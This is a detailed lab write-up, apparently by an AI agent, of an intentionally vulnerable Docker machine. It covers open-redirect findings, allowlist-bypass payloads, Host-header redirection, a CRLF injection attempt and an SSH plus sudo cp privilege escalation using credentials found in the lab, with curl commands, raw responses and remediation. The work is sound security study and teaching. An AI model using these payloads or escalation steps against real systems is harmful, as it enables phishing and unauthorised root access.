# 98 Redirection — writeup

**Class gap this engagement fills.** Open redirect is **absent from the methodology entirely**.
No lab in the corpus had ever treated it. This is its first evidence, so the writeup has to
define the class from scratch in a form that generalises past this lab — including the
calibration that makes the rule usable: **what an open redirect is worth when nothing
consumes it.** Everything below is read off the artefact, cited `file:line`, and separated
into Findings / Controls that held / Instrumentation defects.

Lab 98 is three deliberately distinct vulnerable handlers, not one. The design is the
teaching material: the same bug class implemented three ways, with three different
validators, and each validator is bypassable in a way that reveals *what kind* of validator
it was.

---

## Surface

```
$ nmap -sV -Pn -p- 172.17.0.8
Nmap scan report for 172.17.0.8)
Host is up (0.000047s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
```

**Stack, from the artefact — not from memory.** Apache httpd 2.4.62
(`/var/log/apache2/error.log:1` `AH00163`), PHP 8.2.26
(`/etc/apache2/mods-enabled/php8.2.load`, `php -v`), OpenSSH 9.2p1 Debian 2+deb12u3.
PID 1 = `/bin/sh -c service apache2 start && service ssh start && tail -f /dev/null`
(`ps aux`) — two services, no supervisor, no init system.

**Topology, read not run.** `auto_deploy.sh:131` is a single
`docker run -d --name $CONTAINER_NAME $IMAGE_NAME` on the default bridge. No compose, no
`macvlan`, no `--internal`, no second host. One container, two ports. (`auto_deploy.sh:145`
is the `while true`; it was read, never executed.)

**What TCP cannot see — measured.** `cat /proc/net/tcp` returned 2 data rows
(`00000000:0050` = 80, `00000000:0016` = 22), both `st 0A` = LISTEN. `cat /proc/net/udp`
read in full: **0 data rows**, header only. `docker inspect .Config.ExposedPorts` = `null`.
No UDP surface. Negative carries its work count.

**Docroot inventory — complete, 7 files.** `/var/www/html` holds
`index.html` plus `laboratorio{1,2,3}/{index.html,redirect.php}`. Total PHP: **49 lines**
(`wc -l` on the three `redirect.php` = 12 + 17 + 20). The whole attack surface is 49 lines
of PHP, which is why this writeup can cite every line that matters.

**Every route that emits a `Location`.** This was searched, not assumed:

```
$ grep -rniE "RewriteRule|Redirect|RedirectMatch|ErrorDocument|Alias" \
    /etc/apache2/apache2.conf /etc/apache2/sites-enabled/ /etc/apache2/conf-enabled/
(no output)
```

`mod_rewrite` is **not loaded** (`ls /etc/apache2/mods-enabled/` contains no `rewrite.load`).
`mod_alias` is loaded but no `Alias`/`Redirect` directive exists anywhere.
`find /var/www -name .htaccess` → no output, and it could not have worked anyway:
`AllowOverride None` at `/etc/apache2/apache2.conf:172` means a per-directory file cannot
speak (the same structural point as lab 146). So the complete inventory of `Location`
emitters is:

| # | Emitter | Source | Destination decided by |
|---|---|---|---|
| 1 | `laboratorio1/redirect.php` | `redirect.php:7` | the **user** (`?url=`) |
| 2 | `laboratorio2/redirect.php` | `redirect.php:11` | user, after a prefix filter |
| 3 | `laboratorio3/redirect.php` | `redirect.php:14` | user, after a host-substring filter |
| 4 | Apache `mod_dir` DirectorySlash | `dir.load` enabled, `ServerName` unset | the **request `Host`** |

Emitter 4 is not in the lab's own material and is the most interesting one.

---

## The class — open redirect, stated generally

**Entry criterion.** *Does a request-supplied value reach a `Location` header such that the
`Location`'s origin is not fixed by the server?* Everything else is elaboration. "It
redirects off-site" is not the criterion, because a redirect to a second origin of the same
application is not open redirect, and a redirect the server fully controls is not either.
The criterion is about **provenance of the destination**, not about the destination.

Four discriminators decide whether an instance is a *finding* or a *feature*. All four were
applied here, and each one changed the answer.

**1. Arbitrary external origin, or a known set?**
The parameter must accept an origin the server never enumerated. If the reachable set is
closed and server-side, the feature is a navigation aid, not a bug. `laboratorio2` and
`laboratorio3` *intend* a closed set (`https://www.google.com`, `google.com`) and both fail
to achieve it — the intent is documented, the enforcement is not.

**2. Who decides the destination — the user, or the server?**
This is the discriminator that most reports skip, and it separates two different bugs that
get filed under the same CWE.

- A **server-chosen destination from a user-supplied *path*** is open redirect. The origin
  is fixed; the user picks where within/beyond it to go.
- A **server-chosen destination from a user-supplied *origin*** is a *different* bug and
  usually a *worse* one. The user does not even supply a path — the server composes the
  whole URL, and the only attacker-controlled part is the authority. This is
  CWE-644 (improper neutralisation of HTTP headers) escalating to CWE-601, and it is the
  primitive behind host-header cache poisoning and password-reset poisoning. In this lab it
  is Finding 4, and it was found only by asking "who built this `Location`?" rather than
  "what did the user put in the query string?"

**3. Is there a token on the redirect itself?**
An *unparameterised* `Location` derived from a request header is a **header-injection
primitive**, not merely an open redirect, and it is a different finding with a different
severity. The test is whether the value is passed through a structured API
(`header('Location: …', false, 302)`) or splashed raw into a header string, and whether the
runtime permits a second header after a newline. `redirect.php:7` splashes raw; the runtime
then refuses the newline. See Finding 5 and Controls.

**4. What is the impact chain?**
An open redirect is only as serious as what it feeds. The four chains that turn it into a
real compromise, in ascending order of severity: an **OAuth `redirect_uri`** (the token
itself leaks, because the IdP will only redirect to a registered origin — but an open
redirect is exactly how an unregistered origin is smuggled past that check); a
**password-reset link** (host-header variant ⇒ the victim resets a password on the
attacker's host); a **pre-filled credential form**; and an **authenticated session**
(the referrer and any URL fragment ride along on the hop). Each of these converts a
phishing enabler into account compromise.

### Calibration — what an open redirect is worth with **no** chain attached

This is the part that makes the rule usable, and this lab is a clean specimen because the
chain is **absent**, not merely unfound.

Measured, not assumed: the entire docroot is 7 files, and a search for
`session|setcookie|cookie|oauth|redirect_uri|token|password|passwd|login|auth|reset|forgot|secret`
across `/var/www/html/` returns **exactly one hit** — the platform's own reward string in
`index.html:91`. `php -i` reports `session.auto_start => Off`. `mod_session` is *available*
(`/etc/apache2/mods-available/session.load`) but **not enabled** in `mods-enabled/`. Both
security headers in `conf-available/security.conf:51,58` are commented out. There is no
login form, no session, no OAuth client, no reset endpoint.

The absence of cookies was then **proved rather than assumed**, with a manufactured oracle
(defect #10: a negative with no work count is untested). A loopback listener under my own
control was started to emit `Set-Cookie: ORACLE_SID=canary123`, and the *identical* detector
(`curl -c jar -b jar`, both flags together per defect #4) was run against it and against the
lab:

| Target | `Set-Cookie` seen | `Location` seen |
|---|---|---|
| oracle (127.0.0.1:9099) | **1** | 1 |
| lab, 3 redirect sinks + 3 mod_dir paths + `/` (7 requests) | **0** | 6 |

The detector demonstrably fires. The lab emits no cookie on any of the seven paths.

**So the calibration is: an open redirect with no chain is a phishing enabler, and nothing
more.** Its properties are real but bounded —

- the *lure* lives on the target's own origin, so pre-click inspection of the visible URL
  passes. Measured here: the target origin already serves an off-site link under a nameable
  path (`laboratorio1/index.html:55` → `href="redirect.php?url=http://google.com"`), and
  `http://172.17.0.8/laboratorio1/redirect.php?url=http://evil.invalid/pwned` keeps
  `172.17.0.8` in the address bar until the 302 is followed;
- the attacker needs **no infrastructure of their own on the critical path** — the
  redirection is performed by the trusted host, so reputation, TLS and allowlists applied to
  the *link* all pass;
- the impact is on the **victim's judgement**, not on the target's confidentiality,
  integrity or availability. Nothing is taken from the operator.

That is `C:N/I:N/A:N` with `UI:R` and `PR:N` — a **Low-to-Medium phishing-enablement
finding**, and it should be filed at that severity, not inflated. Its severity is not a
property of the redirect; it is a property of the redirect **plus its consumer**. When
someone reports an open redirect without asking what consumes it, they have reported half a
finding and cannot tell which half.

A useful corollary, which this lab also demonstrates: **a validated open redirect is still
an open redirect.** Labs 2 and 3 both have a filter, both filters fire on the allowlisted
value, and both are bypassed. A filter's existence is not a control; only a filter that
rejects the off-origin case is.

---

## Chain

The open-redirect chain is a *victim-side* chain and its terminal hop is **not testable
within scope** (see NOT tested). What is measurable is the server side and the identity at
every hop:

| # | → | Mechanism | Identity proof |
|---|---|---|---|
| 1 | `www-data` | `redirect.php:7,11,14` — `header("Location: $url")` | `ps aux`: apache workers run `www-data` (uid 33) |
| 2 | attacker-supplied origin | 302 with attacker-controlled `Location` | raw `Location:` header, quoted below |
| 3 | victim browser | follows the `Location` | **NOT TESTED** — requires a victim, out of scope |
| 4 | — | no server-side consumer exists | oracle: 0 `Set-Cookie` over 7 paths |

The escalation chain found in this lab is **not** part of the open-redirect class and is
reported separately as Finding 6:

| # | → | Mechanism | Identity proof |
|---|---|---|---|
| 1 | `balu` uid=1000 | SSH, credential disclosed in-page at `index.html:91` | `uid=1000(balu) gid=1000(balu) groups=1000(balu),100(users)` |
| 2 | `balulito` uid=1001 | SSH, credential in world-readable `/secret.bak` | `uid=1001(balulito) gid=1001(balulito) groups=1001(balulito),100(users)` |
| 3 | `root` uid=0 | `sudo -n /bin/cp` (NOPASSWD) creates a root-owned artefact | `uid=0(root) gid=0(root)`, artefact measured — see Finding 6 |

---

## Findings

### Finding 1 — Unvalidated open redirect, arbitrary external origin (CWE-601)

**Source:** `/var/www/html/laboratorio1/redirect.php:3,6-8`

```php
3  $url = isset($_GET['url']) ? $_GET['url'] : '';
6  if (!empty($url)) {
7      header("Location: $url");
8      exit();
```

The comment on line 5 says it outright: *"Realiza la redirección sin validar la entrada"*.
There is no allowlist, no scheme check, no `parse_url`, nothing.

**Literal evidence** — raw `Location` header, byte for byte (`cat -A`, `^M` = CR):

```
$ curl -sS -o /dev/null -D - "http://172.17.0.8/laboratorio1/redirect.php?url=http://evil.invalid/pwned"
HTTP/1.1 302 Found^M$
Date: Wed, 30 Sep 2026 04:47:04 GMT^M$
Server: Apache/2.4.62 (Debian)^M$
Location: http://evil.invalid/pwned^M$
Content-Length: 0^M$
Content-Type: text/html; charset=UTF-8^M$
^M$
```

Two further forms accepted, confirming the sink is unconstrained rather than
scheme-restricted:

```
?url=//evil.invalid/pwned      -> 302  Location: //evil.invalid/pwned
?url=POST (method-agnostic)    -> 302  Location: http://evil.invalid/post
```

The sink is **method-agnostic** (POST redirects identically), which widens the phishing
surface: a lure need not be a navigable link.

**Impact:** arbitrary external destination chosen by the user, from the target's own origin.
Calibrated per the section above: phishing enabler, `C:N/I:N/A:N`, no server-side consumer
exists in this lab.

**Root cause:** `header()` called with a fully user-controlled value and no validation of
any kind.

**Remediation:** do not take a destination from the user. If a same-site return path is
required, map an opaque key to a server-side destination, or validate against a strict
allowlist of exact origins using `parse_url()` + comparison of **scheme and host separately**
— never a substring or prefix test.

---

### Finding 2 — Allowlist bypassed by prefix match: `https://www.google.com@evil.invalid` (CWE-601)

**Source:** `/var/www/html/laboratorio2/redirect.php:3,9`

```php
3  $allowed_url = 'https://www.google.com';
9  if (strpos($url, $allowed_url) === 0) {
11     header("Location: $url");
```

`strpos(...) === 0` is a **prefix** test. It asks "does the string begin with the allowed
value?" and never asks where the authority ends.

**Literal evidence:**

```
$ curl -sS -o /dev/null -D - ".../laboratorio2/redirect.php?url=https://www.google.com@evil.invalid/"
HTTP/1.1 302 Found^M$
Location: https://www.google.com@evil.invalid/^M$
```

The string does begin with `https://www.google.com`, so the filter passes. The browser does
not read it that way: everything before `@` is **userinfo**, and the authority is
`evil.invalid`. The victim lands on the attacker's host while the allowlisted name is
visible in the URL bar.

A second, argument-free bypass of the same filter — no reliance on userinfo rendering:

```
$ curl -sS -o /dev/null -D - ".../laboratorio2/redirect.php?url=https://www.google.com.evil.invalid/"
HTTP/1.1 302 Found^M$
Location: https://www.google.com.evil.invalid/^M$
```

`google.com.evil.invalid` is a hostname entirely registrable by the attacker, and it begins
with the allowlisted string. This is the stronger of the two proofs because it requires no
argument about how a user agent parses userinfo — only that the registrable domain is
`evil.invalid`.

**Impact:** arbitrary external origin, same calibration as Finding 1.

**Root cause:** a prefix comparison used where an exact-origin comparison is required. The
filter validates the *string*, not the *origin* — and the origin is what matters.

**Remediation:** parse the URL, then compare `scheme` and `host` for exact equality against
a list of permitted origins. Reject any userinfo component. Normalise before comparing.

---

### Finding 3 — Allowlist bypassed by host-substring match: `http://google.com.evil.invalid` (CWE-601)

**Source:** `/var/www/html/laboratorio3/redirect.php:3,9,12`

```php
3   $allowed_domain = 'google.com';
9   $parsed_url = parse_url($url);
12  if (isset($parsed_url['host']) && strpos($parsed_url['host'], $allowed_domain) !== false) {
14      header("Location: $url");
```

`!== false` is a **contains** test. `google.com` appearing *anywhere* inside the host is
accepted; the code never checks that it is the host's end, nor that nothing follows it.

**Literal evidence:**

```
$ curl -sS -o /dev/null -D - ".../laboratorio3/redirect.php?url=http://google.com.evil.invalid/"
HTTP/1.1 302 Found^M$
Location: http://google.com.evil.invalid/^M$
```

**Root cause:** substring matching against a hostname, which is the canonical CWE-20-style
mistake — `google.com.evil.invalid` *contains* `google.com` and is not `google.com`.

**Remediation:** compare `parse_url($url)['host']` for **exact equality** against the
allowlist, case-insensitively, after stripping a single trailing dot. Never use
`strpos`/`strstr` against a hostname.

**Note on the three filters, which is the transferable part.** Labs 2 and 3 use
`strpos` twice, with `=== 0` in one and `!== false` in the other, and both are bypassable —
but by *different* payloads, and the two validators differ in what they admit:

| Payload | lab 2 (`=== 0` prefix) | lab 3 (`!== false` contains) |
|---|---|---|
| `https://www.google.com@evil.invalid/` | **302 → off-site** | **200 rejected** |
| `https://www.google.com.evil.invalid/` | **302 → off-site** | rejected (host does not contain the string) |
| `http://google.com.evil.invalid/` | rejected | **302 → off-site** |
| `http://google.com@evil.invalid/` | rejected | rejected |
| `http://evil.invalid/google.com` (in path) | rejected | **200 rejected** |
| `http://evil.invalid/` | **200 rejected** | **200 rejected** |

Lab 3's `parse_url()` genuinely improves on lab 2: the userinfo trick that defeats lab 2 is
**rejected** by lab 3, because `parse_url` places `www.google.com` in the `user` component,
leaving `host = evil.invalid`, and `strpos('evil.invalid','google.com') === false`. That is
a control that held, and it is why the two labs are worth having side by side: `parse_url`
fixes the userinfo confusion and still leaves substring matching wide open.

---

### Finding 4 — Open redirect via `Host` header: Apache composes the `Location` from the request origin (CWE-644 → CWE-601)

**This is the finding that "it redirects off-site" would have missed**, because there is no
`url` parameter and no application code involved at all.

**Source:** `/etc/apache2/sites-enabled/000-default.conf:9` — `#ServerName www.example.com`
is **commented out**. `mod_dir` is enabled (`/etc/apache2/mods-enabled/dir.load`,
`dir.conf` present), `DirectorySlash` is on by default, and with no `ServerName` and no
`UseCanonicalName` directive the `Off` default applies for a `VirtualHost` — so Apache
builds the `Location` from the **`Host` header the client sent**.

**Literal evidence.** The control, first — a same-origin `Location` I expected:

```
$ curl -sS -o /dev/null -D - "http://172.17.0.8/laboratorio1"
HTTP/1.1 301 Moved Permanently^M$
Location: http://172.17.0.8/laboratorio1/^M$
```

The treatment — one header changed, nothing else:

```
$ curl -sv -o /dev/null -D - -H 'Host: evil.invalid' "http://172.17.0.8/laboratorio1"
> GET /laboratorio1 HTTP/1.1^M$
> Host: evil.invalid^M$                      <- verbose trace: the header DID arrive (defect #5)
< HTTP/1.1 301 Moved Permanently^M$
Location: http://evil.invalid/laboratorio1/^M$
```

The server composed a complete off-site URL from an attacker-supplied **origin**, with no
user-supplied path. Every directory in the docroot is a redirector:

```
/laboratorio1  -> 301  Location: http://evil.invalid/laboratorio1/
/laboratorio2  -> 301  Location: http://evil.invalid/laboratorio2/
/laboratorio3  -> 301  Location: http://evil.invalid/laboratorio3/
/              -> 200  (DocumentRoot itself is served directly, no DirectorySlash)
```

**Why this is a different bug from Findings 1–3**, and why it ranks higher: the *server*
decides the destination and the attacker only supplies the origin. This is precisely the
discriminator from the class definition, and it is the primitive behind host-header cache
poisoning and password-reset-link poisoning. In an application with a password-reset flow,
this alone is account takeover; here there is no such flow, so its standalone value is again
bounded to phishing — but the *root cause* is a server misconfiguration affecting every path,
not a parameter, and it would survive fixing all three PHP handlers.

**Root cause:** `ServerName` unset in the `VirtualHost` with `UseCanonicalName` at its `Off`
default, so the canonical name is taken from the request.

**Remediation:** set `ServerName` explicitly, or set `UseCanonicalName On` in the
`VirtualHost`, and validate the `Host` header against a known set at the edge. Do not rely
on the framework to sanitise it — here there is no framework in the path.

---

### Finding 5 — CRLF / response splitting primitive present in code, blocked only by the PHP runtime (CWE-113)

**Reported as a latent finding, not an exploitable one.** The distinction matters and is
the whole content of this item.

`redirect.php:7` is `header("Location: $url")` with **no newline filtering whatsoever** in
the application. That is an unparameterised `Location` — the shape the class definition
flags as a header-injection primitive rather than merely an open redirect. Whether it is
exploitable is decided by the runtime, so the runtime was measured rather than assumed.

**Oracle first** (defect: a filter that rejects must be distinguished from a request that
never carried the payload). `%0d%0a` really does decode to CR+LF in `$_GET` on this exact
build:

```
$ php -r 'parse_str("url=http://evil.invalid/%0d%0aX-Injected:%20yes", $_GET); ...'
php_version=8.2.26
len=37
hex=687474703a2f2f6576696c2e696e76616c69642f0d0a582d496e6a65637465643a20796573
has_CR=YES  has_LF=YES
```

`0d0a` at offset 22. The transport is proven; the payload is not being lost in transit.

**The target's own log is the decisive evidence:**

```
$ tail -12 /var/log/apache2/error.log
[Wed Sep 30 04:48:51.212589 2026] [php:warn] [pid 41:tid 41] [client 172.17.0.1:44832]
  PHP Warning:  Header may not contain more than a single header, new line detected
  in /var/www/html/laboratorio1/redirect.php on line 7
```

And the HTTP-observable consequence — **no `Location` header at all**, which is what
distinguishes "runtime refused" from "runtime stripped the newline and redirected":

```
$ curl -sS -o b -D h "http://172.17.0.8/laboratorio1/redirect.php?url=http://evil.invalid/%0d%0aX-Injected:%20yes"
HTTP/1.1 200 OK^M$          <- no Location: line
BODY bytes=0
```

**Assessment.** Three states were possible and all three are now excluded: the CRLF did
arrive (hex proof), the runtime refused it (log proof), and it did not silently truncate
into a valid `Location` (no `Location` present). The control that held is **PHP 8.2.26's
`header()`**, not the application — the application has no filter at all. PHP has refused
newlines in `header()` since 5.1.2, so the same code on an older runtime would inject a
second response header, and `Set-Cookie` injection (session fixation) would follow from it.

**Remediation:** do not rely on the runtime. Reject `\r` and `\n` in any value used in a
header, and use `header($name . ': ' . $value, true, $code)` with an explicit status.

---

### Finding 6 — Plaintext credential in a world-readable file grants passwordless root (CWE-522 / CWE-256 / CWE-732)

**Outside the open-redirect class, reported because the class definition requires it.** The
class definition says: *if the chain runs through a token whose value lives somewhere the
attacker can read or predict, that token-storage choice is its own finding.* This is the
third time in this corpus that has been true. It is a **finding I did not use** to reach
the open redirect, and it is filed separately so that patching the redirect handlers is not
mistaken for patching the machine.

**Source:** `/secret.bak` — `-rw-r--r-- 1 balu balu 25 Dec 26 2024 /secret.bak`, mode
**644**, owner `balu:balu`, at the filesystem root, **outside** the docroot
(`DocumentRoot /var/www/html`, `000-default.conf:12`).

```
$ cat /secret.bak
balulito:balulerochingon
```

Mode 644 at `/` means **every local identity can read it** — `www-data` included.

**The credential is real and it escalates:**

```
$ ssh balulito@172.17.0.8   # password from /secret.bak
uid=1001(balulito) gid=1001(balulito) groups=1001(balulito),100(users)
$ sudo -n -l
User balulito may run the following commands on f6748049babe:
    (ALL) NOPASSWD: /bin/cp
```

**Root reached, proven with a manufactured oracle** (this vector's success is a *state*,
not a message, so a marker distinguishable by design is required — a random token and a
timestamp, in a path the low-privilege user cannot pre-create):

```
MARKER=R98-1790743839-14653
$ touch /tmp/$MARKER                    # as balulito -> own file, uid=1001
$ sudo -n cp /etc/hostname /tmp/$MARKER.root
SUDO CP EXIT=0
$ stat -c 'name=%n uid=%u(%U) gid=%g(%G) mode=%a' /tmp/$MARKER.root
name=/tmp/R98-1790743839-14653.root uid=0(root) gid=0(root) mode=644
$ cat /tmp/R98-1790743839-14653.root
f6748049babe                            # this container's /etc/hostname
```

A root-owned artefact with this container's own hostname in it, created by a command the
unprivileged identity was permitted to run. Not a claim about the future — a measured
result.

**Contrast, which is the point:** the credential the platform *does* disclose,
`index.html:91` (`balu` / `balulero`), reaches `uid=1000(balu)` and then
`sudo: a password is required` — no escalation. The credential in the world-readable file
reaches `uid=0`. **The disclosed reward is the weaker credential and the leaked file is the
real one.** An operator reading only `index.html` would conclude the machine has no
privilege escalation.

**Reachability, stated honestly.** `/secret.bak` is **not** web-reachable — all four
traversal attempts returned `404` (272 bytes each): `/secret.bak`, `/../secret.bak`,
`/..%2fsecret.bak`, `/%2e%2e/secret.bak`. `AllowOverride None`
(`apache2.conf:172`) and `mod_rewrite` absent mean no route reaches `/`. So this requires
an **initial local or SSH foothold**; it is a post-authentication privilege escalation and
credential-disclosure issue, not a remote one. Its severity is therefore high but
**conditional**, and that condition is the honest way to file it.

**This contradicts the lab's own published description**, which states *"No hay escalada de
privilegios en esta máquina."* The measurement is the reportable fact: escalation exists and
is reachable in two commands from a mode-644 file.

**Remediation:** remove plaintext credentials from the filesystem entirely; if a bootstrap
credential is unavoidable, deliver it out of band with a single-use token rather than a
persistent file. Scope `sudoers` to the specific arguments required rather than
`(ALL) NOPASSWD: /bin/cp`, which is a general-purpose root write primitive (`cp` of a
crafted file over a target path is the standard route to full root).

---

## Controls that held

Each with the positive control that proves the detector can fire. A control that has never
seen a success is not a control.

| Control | Where | Positive control that proves this detector works |
|---|---|---|
| **Lab 2's allowlist rejects a plainly off-origin value** | `laboratorio2/redirect.php:13-15` | The same filter **accepts** `?url=https://www.google.com` → `302`, `Location: https://www.google.com`, 0-byte body. The filter fires. |
| **Lab 3's `parse_url` defeats userinfo confusion** (defeats lab 2's bypass) | `laboratorio3/redirect.php:9,12` | Same byte-identical payload `https://www.google.com@evil.invalid/` gives **200 + 60 bytes** here and **302 + `Location:`** in lab 2. Two different outcomes from one string ⇒ the discriminator is real, not a coincidence. |
| **Lab 3 checks `host`, not the whole URL** | `laboratorio3/redirect.php:12` | `?url=http://evil.invalid/google.com` → `200`, 60 bytes rejected, while `?url=http://google.com.evil.invalid/` → `302`. The token must be in the host component. |
| **PHP `header()` refuses embedded CRLF** | PHP 8.2.26 runtime | The CRLF's arrival was proven independently (`hex` contains `0d0a`), and the refusal is in the target's own log: `PHP Warning: Header may not contain more than a single header, new line detected in .../redirect.php on line 7`. |
| **Apache validates the `Host` header** | Apache 2.4.62 | Benign `Host: evil.invalid` → `301` + `Location: http://evil.invalid/laboratorio1/`; a `Host` carrying a path → `400`; duplicate `Host` → `400`. Per defect #16 the status alone is not the verdict — the discriminator is the `Location` line: 1 in the first case, **0** in the two rejected cases. |
| **Apache rejects CR/LF in the request line** | Apache 2.4.62 | `GET /laboratorio1/%0d%0aX-Injected:%20yes` → `404`, 272 bytes, **0** `Location` lines. |
| **Path traversal cannot reach `/secret.bak`** | `000-default.conf:12`, `apache2.conf:172` | All four encodings returned `404` with 272 bytes each (a counted work result, not a silent negative). |
| **Lab 1 degrades safely on an array parameter** | `redirect.php:3,7` | `?url[]=http://evil.invalid` → `302` with `Location: Array` — PHP's array-to-string coercion. Not dangerous, and worth knowing it does not become a second primitive. |

**Positive controls for the `Location` detector itself**, run before any conclusion was
drawn from an external `Location`:

```
CTRL-1  ?url=http://172.17.0.8/dest   -> 302  Location: http://172.17.0.8/dest      (same-origin, expected)
CTRL-2  /laboratorio1                  -> 301  Location: http://172.17.0.8/laboratorio1/
CTRL-3  lab2 allowlisted value         -> 302  Location: https://www.google.com
```

CTRL-3 is the one that matters most: it is the **allowlisted success**, so "lab 2 blocked
my payload" is a statement about my payload rather than about a filter that never runs.

---

## NOT tested

Kept separate from *discarded with reason*, because these are gaps in coverage, not
conclusions.

- **Victim-side delivery — not tested, and structurally untestable here.** The escalation
  from "the server emits an off-site `Location`" to "a human is phished" needs a victim
  browser, a page to click from, and a destination to land on. Producing it would have
  required either a public redirector or a phishing host — **third-party infrastructure,
  out of scope, and explicitly forbidden for this engagement.** The finding is therefore
  proven from the `Location` header alone, and the delivery half is **not claimed**.
- **`Referer` / cookie / fragment leakage on the redirect hop** — not tested. Follows from
  the absent consumer: there is no session to leak (0 `Set-Cookie` over 7 paths, oracle
  green), so there is nothing to measure.
- **OAuth `redirect_uri` smuggling** — not tested; no OAuth client exists in the 7-file
  docroot. The technique is described in the class definition, not claimed as a result here.
- **Password-reset poisoning via Finding 4** — not tested; no reset endpoint exists.
- **Cache poisoning via Finding 4** — not tested. `mod_cache` is not in `mods-enabled/`, and
  no caching layer sits in front of the container on the default bridge.
- **Whether the lab's platform grades the three sub-labs** — not tested. I did not submit to
  DockerLabs; the reward analysis below is based on the shipped artefacts only.
- **Windows/IE-specific userinfo parsing** for the lab-2 bypass — not tested. Finding 2 does
  not depend on it; the `google.com.evil.invalid` proof stands without any userinfo argument.

## Discarded with reason

- **CRLF response splitting / `Set-Cookie` injection** — discarded as *not exploitable on
  this runtime*, with the reason established rather than assumed: `%0d%0a` provably reached
  `$_GET` (hex `…0d0a…`), and PHP 8.2.26 refused it with a logged warning. Retained as
  Finding 5 because the code has no filter and the runtime is the only control.
- **Apache `Host` header carrying a path** (`Host: evil.invalid/owned/page.html`) —
  discarded, `400 Bad Request`. Apache validates the authority syntax.
- **Duplicate `Host` header** — discarded, `400 Bad Request`.
- **`url[]=` array injection as a second primitive** — discarded, degenerates to
  `Location: Array`. Counted, not assumed.
- **Reading `/secret.bak` over HTTP** — discarded, 4/4 traversal encodings returned 404.
  The credential is local-only; this bounds Finding 6's severity rather than inflating it.
- **Brute force** — not attempted. Both credentials were disclosed in shipped artefacts;
  exactly two SSH logins were made, one per disclosed credential.

---

## Instrumentation defects

What lied to me, or nearly did, during this engagement.

**1. `/tmp/opencode` was wiped mid-run by a concurrent worker, and it read as "no data".**
My first matrix run produced `BODY bytes=` **blank** with `head: cannot open ... No such
file or directory` interleaved. Treated naively, a blank byte count is a zero, and a zero
means *untested* — I would have filed "lab 1 returns an empty body" as a measured property
of the app. It was not: the scratch directory had been deleted between my `mkdir` and the
`curl` write. **Resolution:** re-ran on a collision-proof path and the real figure appeared
— the negative body is **42 bytes** (`No se proporcionó una URL para redirigir.`, UTF-8),
and the rejection bodies are **60 bytes**. This is `self-corrections.md` §14 in a new
costume: the failure did not look like a missing file, it looked like a number that was
zero. *Any blank or absent count is untested, not zero.*

**2. My own variable name collided with a file, and the error was silent about which.**
I wrote `W=/tmp/...` into a file named `/tmp/opencode/r98dir` and then `source`d it, while a
directory of the same name already existed. The resulting `curl -o` failures printed
`Not a directory` — which I initially misread as a filesystem or permission problem and
started debugging the wrong layer. **Resolution:** `rm -f` the file, use an explicit path,
confirm with `test -d` before use. Cheap to state, cost two tool calls.

**3. Defect #5 (`rtk curl` can silently drop `-H`) nearly invalidated Finding 4, and the
positive control is what caught it.** Finding 4 rests entirely on one `-H 'Host:
evil.invalid'`. A dropped header would have produced the *baseline* same-origin `Location`,
which I would have read as "the Host injection did not work" — a false negative shaped
exactly like a failed exploit. It was caught because the `Location` **changed**, and then
confirmed in a `-sv` trace showing `> Host: evil.invalid` on the wire. **Rule: any finding
that depends on a header must show that header in a verbose trace, not infer it from the
response.**

**4. Defect #3 (redirect-following) was avoided by construction, and it is worth stating
why it was especially dangerous *here*.** Every measurement in this writeup was taken with
`curl` **without** `-L`, reading `Location` from the header block. Had any probe followed
the redirect, the request would have ended at a non-routable `.invalid` name, and the tool
would have reported a resolution failure or a connection error — reading as "the
destination is unreachable" or "the redirect is blocked", when in fact the redirect had
fired perfectly. An earlier worker in this corpus had a conclusion inverted by exactly this.

**5. Every `Location` value used as a destination was an RFC 2606 `.invalid` name, and no
outbound connection was ever made.** Not an instrumentation defect but a measurement
hazard I was controlling for: had I used a real registrable domain, a proof of open
redirect would have become an outbound request to third-party infrastructure, and the
evidence would have depended on someone else's server responding. `evil.invalid` is
non-routable by definition, so the entire proof rests on bytes the lab itself emitted.

**6. A "no cookie anywhere" conclusion would have been untested without a manufactured
oracle.** There is no page in this lab that emits `Set-Cookie`, so the detector had never
seen a success — the exact shape of `self-corrections.md` §1. I stood up a loopback
listener that emits a canary cookie and ran the *identical* detector against both: **1
cookie from the oracle, 0 from the lab across 7 paths.** The negative now carries a work
count and a green control.

**7. My own artefact could not be cleaned up with the primitive I had been granted — and I
did not work around it.** The root proof left `/tmp/R98-….root`, owned by root. `sudo -n rm`
is not in the allowlist (only `/bin/cp`), and `/tmp`'s sticky bit blocks unlink by a
non-owner. The correct response was **not** to escalate further to delete it: stage 9
recreates the container from the image, which destroys `/tmp` outright. Verified after
recreation: `ls /tmp/ | grep R98` → `NONE - clean`.

---

## Reward

**No `FLAG{}` or `DL{…}` value exists in this lab.** Documented search, not assumption:

| Search | Work count / result |
|---|---|
| `find / -xdev \( -iname '*flag*' -o -iname '*secret*' -o -iname '*.txt' \)` | read the whole filesystem minus `/proc`,`/sys`,`/usr`,`/var/lib/dpkg`,`/etc/ssl`; returned **1** hit: `/secret.bak` — which contains `balulito:balulerochingon` and no flag token |
| `grep -aoE '(FLAG\|DL)\{[^}]*\}'` on `/root/.bashrc` | no match |
| `grep -aoE '(FLAG\|DL)\{[^}]*\}'` on `/secret.bak` | no match |
| `ls -la /home/ /root/` | only `balu` and `balulito` home dirs, both `drwx------`, empty; no `.ssh` in either (`ls /home/*/.ssh /root/.ssh` → `no .ssh dirs`) |

**The actual reward mechanism is SSH access, disclosed in the page itself** —
`/var/www/html/index.html:91`, inside a client-side `alert()`:

> *"Accede por SSH con estas credenciales SOLO cuando hayas completado los retos anteriores.
> Usuario: balu — Password: balulero"*

Verified, one login, no brute force:

```
$ ssh balu@172.17.0.8   # balu / balulero
uid=1000(balu) gid=1000(balu) groups=1000(balu),100(users)
$ sudo -n -l
sudo: a password is required
```

This is consistent with **26 of 32** corpus labs having no `FLAG{}`, and with this lab's own
published description. It is also the setup for Finding 6: the disclosed reward is the
**weaker** of the two credentials on the machine.

---

## Restore

```
$ docker rm -f redirection_container && docker run -d --name redirection_container redirection:latest
```

Recreated from the image, not by undoing edits. **Verified positively** — the service
answers *and* the `Location` fires, on the shipped image:

```
/                                                          -> 200  bytes=3205
/laboratorio1                                              -> 301  Location: http://172.17.0.8/laboratorio1/
/laboratorio1/redirect.php?url=http://evil.invalid/verify  -> 302  Location: http://evil.invalid/verify
